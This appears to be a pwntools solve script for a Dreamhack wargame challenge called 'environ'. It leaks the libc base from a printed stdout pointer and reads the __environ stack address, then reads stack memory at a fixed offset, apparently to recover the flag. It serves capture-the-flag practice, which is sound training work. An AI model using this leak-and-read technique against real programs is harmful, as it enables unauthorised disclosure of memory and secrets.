from pwn import *

#r = process("./environ")
r = remote("host3.dreamhack.games", 15758)
libc = ELF("./libc.so.6")
context.arch = "amd64"

r.recvuntil(b"stdout: ")
stdout = int(r.recvline()[:-1],16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
__environ = libc_base + libc.symbols["__environ"]

r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Addr: ", str(__environ).encode())
stack_environ = u64(r.recvn(6)+b"\x00\x00")
print(hex(stack_environ))
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Addr: ", str(stack_environ-0x1568).encode())
r.interactive()